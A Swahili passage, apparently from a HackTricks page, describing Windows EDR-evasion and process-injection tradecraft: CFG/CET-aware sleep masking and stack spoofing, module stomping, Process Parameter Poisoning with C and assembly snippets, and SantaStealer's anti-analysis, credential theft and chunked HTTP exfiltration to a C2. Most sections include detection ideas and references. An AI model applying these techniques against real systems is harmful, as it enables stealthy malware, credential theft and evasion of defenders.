- Sajili kila indirect destination inayotumiwa na chain kupitia `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` na entries za `CFG_CALL_TARGET_VALID`.
- Kwa anwani zilizo ndani ya images zilizopakiwa (`ntdll`, `kernel32`, `advapi32`), `MEMORY_RANGE_ENTRY` lazima ianze kwenye **image base** na ihusishe **ukubwa wote wa image**.
- Kwa maeneo yaliyomap kwa mkono/PIC/stomped, tumia **allocation base** na ukubwa wa allocation badala yake.
- Weka alama si kwa dispatch gadget pekee, bali pia kwa exports zinazofikiwa kwa indirect calls (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls) na sections zozote zinazoweza kutekelezwa zinazodhibitiwa na attacker na zitakazokuwa indirect targets.

Hii hubadilisha sleep chains za mtindo wa ROP/JOP kutoka “hufanya kazi tu kwenye processes zisizo na CFG” kuwa primitive inayoweza kutumika tena kwa `explorer.exe`, browsers, `svchost.exe`, na endpoints nyingine zilizocompiliwa kwa `/guard:cf`.

### Stack spoofing salama kwa CET kwa threads zinazolala

Kubadilisha `CONTEXT` yote huonekana wazi na kunaweza kushindwa kwenye mifumo ya CET Shadow Stack kwa sababu `Rip` iliyofanyiwa spoofing bado lazima ilingane na hardware shadow stack. Mbinu salama zaidi ya kuficha sleep ni:<sup>[[30]](#references)</sup>

- Chagua thread nyingine ndani ya process hiyo hiyo na usome mipaka ya stack ya `NT_TIB` / TEB yake (`StackBase`, `StackLimit`) kupitia `NtQueryInformationThread`.
- Hifadhi nakala ya TEB/TIB halisi ya thread ya sasa.
- Nasa context halisi ya thread inayolala kwa `GetThreadContext`.
- Nakili **`Rip` halisi pekee** kwenye spoof context, huku ukiacha `Rsp`/hali ya stack iliyofanyiwa spoofing kama ilivyo.
- Wakati wa sleep, nakili `NT_TIB` ya thread iliyofanyiwa spoofing ndani ya TEB ya sasa ili stack walkers zifanye unwind ndani ya eneo halali la stack.
- Baada ya wait kukamilika, rejesha TIB na thread context ya awali.

Hii huhifadhi instruction pointer inayolingana na CET huku ikiwapotosha EDR stack walkers wanaotegemea metadata ya stack ya TEB kuthibitisha unwinds.

### Njia mbadala inayotumia APC: Kraken Mask

Ikiwa dispatch ya timer-queue ina signature inayotambulika sana, mfuatano huohuo wa sleep-encrypt-spoof-restore unaweza kutekelezwa kutoka helper thread iliyosimamishwa kwa kutumia queued APCs:<sup>[[27]](#references)</sup>

- Unda helper thread yenye `NtTestAlert` kama entrypoint.
- Weka foleni ya `CONTEXT` frames/APCs zilizoandaliwa kupitia `NtQueueApcThread` na uzitekeleze kupitia `NtAlertResumeThread`.
- Hifadhi hali ya chain kwenye heap badala ya stack ya helper ili kuepuka kujaa kwa thread stack ya kawaida ya 64 KB.
- Tumia `NtSignalAndWaitForSingleObject` kutoa ishara ya start event na kuzuia thread kwa hatua moja.
- Simamisha main thread kabla ya kurejesha TIB/context (`NtSuspendThread` → rejesha → `NtResumeThread`) ili kupunguza kipindi cha race ambapo scanner inaweza kunasa stack ambayo haijarejeshwa kikamilifu.

Hii hubadilisha signature ya `CreateTimerQueueTimer` + `NtContinue` na kuweka signature ya helper-thread/APC huku ikihifadhi malengo yaleyale ya RC4 masking na stack-spoofing.

Mawazo ya ziada ya Detection
- `NtSetInformationVirtualMemory` yenye `VmCfgCallTargetInformation` muda mfupi kabla ya sleeps, waits, au APC dispatch.
- `GetThreadContext`/`SetThreadContext` ikitumika pamoja na `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject`, au `ConnectNamedPipe`.
- `NtQueryInformationThread` ikifuatiwa na maandishi ya moja kwa moja kwenye mipaka ya stack ya TEB/TIB ya thread ya sasa.
- Chains za `NtQueueApcThread`/`NtAlertResumeThread` zinazoelekeza kwa njia isiyo ya moja kwa moja kwenye `SystemFunction032`, `VirtualProtect`, au helpers za kurejesha ruhusa za section.
- Matumizi yanayojirudia ya gadget signatures fupi kama `FF 23` (`jmp [rbx]`) au `FF E7` (`jmp rdi`) kama dispatch pivots ndani ya modules zilizotiwa saini.


## Precision Module Stomping

Module stomping hutekeleza payloads kutoka kwenye **`.text` section ya DLL ambayo tayari ime-map ndani ya target process** badala ya kutenga memory ya wazi ya private executable au kupakia sacrificial DLL mpya. Target ya overwrite inapaswa kuwa **image iliyopakiwa na inayoungwa mkono na disk** ambayo code space yake inaweza kubeba payload bila kuharibu code paths ambazo process bado inahitaji.<sup>[[1]](#references)[[2]](#references)</sup>

### Uchaguzi wa target unaotegemeka

Stomping ya moja kwa moja dhidi ya modules za kawaida kama `uxtheme.dll` au `comctl32.dll` si thabiti: huenda DLL haijapakiwa kwenye remote process, na code region ndogo mno itasababisha process ku-crash. Workflow inayotegemeka zaidi ni:

1. Orodhesha modules za target process na uhifadhi orodha ya kujumuisha yenye **majina pekee** ya DLLs ambazo tayari zimepakiwa.
2. Tengeneza payload kwanza na urekodi **ukubwa wake halisi kwa bytes**.
3. Changanua DLLs za wagombea kwenye disk na ulinganishe **`.text` `Misc_VirtualSize`** ya PE section na ukubwa wa payload. Hili ni muhimu zaidi kuliko ukubwa wa faili kwa sababu linaonyesha ukubwa wa executable section **inapomap kwenye memory**.
4. Chambua **Export Address Table (EAT)** na uchague RVA ya function iliyosafirishwa kama offset ya kuanzia kwa stomp.
5. Kokotoa **eneo la athari**: ikiwa payload inazidi mpaka wa function iliyochaguliwa, itafuta exports zilizo karibu zilizopangwa baada yake kwenye memory.

Helpers za kawaida za recon/uchaguzi zinazoonekana porini:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Vidokezo vya kiutendaji
- Pendelea DLL ambazo **tayari zimepakiwa** katika mchakato wa mbali ili kuepuka telemetry ya `LoadLibrary`/upakiaji wa picha usiotarajiwa.
- Pendelea exports ambazo programu lengwa huzitekeleza mara chache; vinginevyo, njia za kawaida za code zinaweza kugusa bytes zilizobadilishwa kabla au baada ya kuundwa kwa thread.
- Implants kubwa mara nyingi huhitaji kubadilisha uingizaji wa shellcode kutoka string literal hadi **byte-array/braced initializer** ili buffer nzima iwakilishwe kwa usahihi kwenye source ya injector.

Mawazo ya utambuzi
- Uandishi wa mbali kwenye kurasa za executable zinazoungwa mkono na image (`MEM_IMAGE`, `PAGE_EXECUTE*`) badala ya allocations za kawaida zaidi za private RWX/RX.
- Entry points za export ambazo bytes zake zilizo kwenye memory hazilingani tena na faili chanzo kwenye diski.
- Remote threads au context pivots zinazoanza kutekelezwa ndani ya export halali ya DLL ambayo bytes zake za mwanzo zimebadilishwa hivi karibuni.
- Mifuatano ya kutiliwa shaka ya `VirtualProtect(Ex)` / `WriteProcessMemory` kwenye kurasa za `.text` za DLL, ikifuatiwa na kuundwa kwa thread.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) ni mbinu ya **process-injection / EDR-evasion** inayokwepa njia ya kawaida ya uandishi wa mbali (`VirtualAllocEx` + `WriteProcessMemory`). Badala ya kunakili bytes ndani ya target ambayo tayari inaendeshwa, hutumia ukweli kwamba Windows **hunakili vigezo fulani vya uanzishaji vya `CreateProcessW` ndani ya mchakato mtoto** na kuvihifadhi ndani ya `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Carriers zinazoweza kutumika vibaya na kunakiliwa na `CreateProcessW`

Carriers zinazofaa ni:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (pamoja na `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Vikwazo vya carriers katika matumizi ya vitendo:

- `lpCommandLine` lazima ielekeze kwenye **memory inayoweza kuandikwa** kwa ajili ya `CreateProcessW`, na ina kikomo cha **herufi 32,767 za Unicode** zikiwemo null terminator.
- `lpEnvironment` lazima iwe environment block ya Unicode yenye mifuatano ya `NAME=VALUE\0` inayofuatana na kumalizika kwa `\0` nyingine ya ziada.
- `lpReserved` imehifadhiwa rasmi, kwa hiyo uhusishaji wa `ShellInfo` unapaswa kuchukuliwa kama maelezo ya utekelezaji badala ya mkataba thabiti uliorekodiwa.

Hii hugeuza uundaji wa kawaida wa mchakato kuwa **primitive ya kuhamisha payload**. Operator huunda mchakato mtoto kwa data ya uanzishaji inayodhibitiwa na mshambuliaji na kuiacha Windows ifanye nakala kati ya michakato.

### Mtiririko wa utafutaji wa mbali bila remote write APIs

Baada ya mtoto kuundwa, tafuta buffer iliyonakiliwa kwa kutumia primitives za **kusoma pekee**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → pata `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Soma `PEB` ya mbali
3. Fuata `PEB.ProcessParameters`
4. Soma `RTL_USER_PROCESS_PARAMETERS`
5. Tumia pointer iliyochaguliwa:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Mtiririko wa chini kabisa:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Kutekeleza buffer ya parameter iliyonakiliwa

Eneo la parameter lililonakiliwa kwa kawaida huwa `RW`, si la kutekelezeka. Mlolongo wa kawaida wa P3 ni:

1. Unda process kama kawaida (bila kuisimamisha)
2. Fanya ukurasa wa parameter uliochaguliwa uweze kutekelezeka kwa kutumia `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Tumia tena handle ya main thread ambayo tayari imerudishwa kwenye `PROCESS_INFORMATION`
4. Elekeza upya utekelezaji kwa kutumia `NtSetContextThread` (`CONTEXT_CONTROL`, batilisha `RIP`)

Tofauti na workflows za kawaida za thread hijacking, hili **halihitaji** `SuspendThread` / `ResumeThread`; context inaweza kubadilishwa moja kwa moja kupitia handle ya main thread iliyorudishwa.

Hili huepuka API kadhaa zinazofuatiliwa mara nyingi kwa ajili ya injection:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- mara nyingi pia `SuspendThread` / `ResumeThread`

### Kizuizi cha null byte na shellcode ya hatua kwa hatua

Carrier zote tatu ni **data ya string au inayofanana na string**, kwa hivyo payload ghafi iliyo na `0x00` hukatwa wakati wa uhamishaji. Njia ya vitendo ya kukabiliana na hili ni kutumia **hatua ya kwanza isiyo na null** inayounda upya constants wakati wa runtime, kisha kupakia hatua ya pili yoyote.

Muundo rahisi ni usanisi wa constant unaotumia XOR:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Hii huruhusu hatua ya kwanza kuunda mifuatano ya stack, hoja za API, njia za DLL au loader ya shellcode ya hatua ya pili bila kuingiza byte null kwenye parameter inayosafirishwa.

### Miito ya API inayotegemea stack kutoka hatua ya kwanza

Wakati hatua ya kwanza inapohitaji kuita API kama `LoadLibraryA`, inaweza:

- kusukuma string/buffer kwenye stack ya target
- kuhifadhi **nafasi ya shadow ya x64 yenye byte 32**
- kuweka `RCX`, `RDX`, `R8`, `R9` kuwa constants au pointers zinazohusiana na `RSP`
- kuhakikisha `RSP` imepangiliwa kwa **byte 16** kabla ya mwito

Kisha hatua ya pili inaweza kunakiliwa kutoka stack hadi kwenye allocation ya `PAGE_READWRITE`, kubadilishwa kuwa `PAGE_EXECUTE_READ` kwa `VirtualProtect`, na kuhamishiwa udhibiti kwa kurukia humo, hivyo kuepuka allocation ya moja kwa moja ya RWX.

### Mawazo ya kugundua

Fursa nzuri za kutafuta zilizotajwa na waandishi:

- `VirtualProtectEx` / `NtProtectVirtualMemory` kubadilisha kurasa za process-parameter kuwa zinazoweza kutekeleza
- mabadiliko hayo ya protection yakifuatwa na `SetThreadContext` / `NtSetContextThread`
- usomaji wa mbali wa `PEB` na kisha `RTL_USER_PROCESS_PARAMETERS`
- thamani za `lpCommandLine`, `lpEnvironment` au `STARTUPINFO.lpReserved` ndefu au zenye entropy kubwa isivyo kawaida wakati wa kuunda process

### Vidokezo

- P3 ni **mbinu ya kuhamisha data kati ya processes**, si primitive kamili ya execution yenyewe: parameter iliyonakiliwa bado inahitaji mabadiliko ya ruhusa ya execution na mbinu ya kuelekeza execution.
- Waandishi walizingatia `RtlCreateProcessReflection` / Dirty Vanity lakini wakaikataa kwa sababu ndani yake hutumia primitives zinazotia shaka kama `NtWriteVirtualMemory` na `NtCreateThreadEx`.

## Mbinu za SantaStealer za Kukwepa Ulinzi Bila Faili na Kuiba Credentials

SantaStealer (pia hujulikana kama BluelineStealer) inaonyesha jinsi info-stealers za kisasa zinavyochanganya AV bypass, anti-analysis na ufikiaji wa credentials katika mtiririko mmoja wa kazi.<sup>[[24]](#references)</sup>

### Udhibiti kwa mpangilio wa kibodi na kuchelewesha sandbox

- Flag ya config (`anti_cis`) huorodhesha mipangilio ya kibodi iliyosakinishwa kupitia `GetKeyboardLayoutList`. Ikiwa itapata mpangilio wa Kisiriliki, sample huunda alama tupu ya `CIS` na kusitisha kabla ya kuendesha stealers, hivyo kuhakikisha hailipuki kwenye maeneo yaliyotengwa huku ikiiacha artifact inayoweza kutafutwa.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Mantiki ya tabaka nyingi ya `check_antivm`

- Lahaja A hupitia orodha ya michakato, huhash kila jina kwa checksum maalum ya rolling, na kulinganisha matokeo na blocklist zilizopachikwa za debugger/sandbox; hurudia checksum kwa jina la kompyuta na kukagua saraka za kazi kama `C:\analysis`.
- Lahaja B hukagua sifa za mfumo (kiwango cha chini cha idadi ya michakato, muda mfupi tangu mfumo uwashe), huita `OpenServiceA("VBoxGuest")` ili kugundua VirtualBox additions, na hukagua muda kabla na baada ya kusubiri ili kubaini single-stepping. Tukigundua chochote, utekelezaji husitishwa kabla ya modules kuanzishwa.

### Helper isiyotumia faili + upakiaji wa kutafakari wa ChaCha20 mara mbili

- DLL/EXE kuu hupachika Chromium credential helper ambayo aidha huhifadhiwa kwenye diski au hupangwa mwenyewe kwenye kumbukumbu; hali isiyotumia faili hutatua imports/relocations yenyewe ili kuepuka kuandika mabaki ya helper.
- Helper hiyo huhifadhi DLL ya hatua ya pili iliyosimbwa mara mbili kwa ChaCha20 (funguo mbili za baiti 32 + nonce mbili za baiti 12). Baada ya kupitia hatua zote mbili, hupakia blob kwa kutafakari (bila `LoadLibrary`) na kuita exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` zilizotokana na [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Routines za ChromElevator hutumia direct-syscall reflective process hollowing kuingiza msimbo kwenye browser ya Chromium inayoendeshwa, kurithi funguo za AppBound Encryption, na kusimbua passwords/cookies/credit cards moja kwa moja kutoka kwenye hifadhidata za SQLite licha ya ABE hardening.


### Ukusanyaji wa moduli ndani ya memory na uhamishaji wa data kwa HTTP katika vipande

- `create_memory_based_log` hurudia jedwali la kimataifa la function pointer `memory_generators` na kuanzisha thread moja kwa kila moduli iliyowashwa (Telegram, Discord, Steam, picha za skrini, hati, browser extensions, n.k.). Kila thread huandika matokeo kwenye buffers zinazoshirikiwa na kuripoti idadi ya faili baada ya muda wa kusubiri wa kuunganisha wa takriban sekunde 45.
- Baada ya kumaliza, kila kitu hubanwa kuwa ZIP kwa kutumia library ya `miniz` iliyounganishwa kwa statically kama `%TEMP%\\Log.zip`. Kisha `ThreadPayload1` husubiri sekunde 15 na kutuma archive hiyo kupitia HTTP POST katika vipande vya MB 10 kwenda `http://<C2>:6767/upload`, huku ikiiga boundary ya browser ya `multipart/form-data` (`----WebKitFormBoundary***`). Kila kipande huongeza `User-Agent: upload`, `auth: <build_id>`, `w: <campaign_tag>` ya hiari, na kipande cha mwisho huongeza `complete: true` ili C2 ijue kuwa kuunganisha upya kumekamilika.

## References

- [1] [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Dynamic-link library search order](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Process security and access rights](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET, and Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Hiding Your Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Abusing Chrome Remote Desktop On Red Team Operations A Practical Guide](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Weaponizing Defender's Remediation Driver as a Kernel Operation Primitive](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [MDSec Function Peekaboo companion code](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: Crafting Self-Masking Functions Using LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)

{{#include ../banners/hacktricks-training.md}}
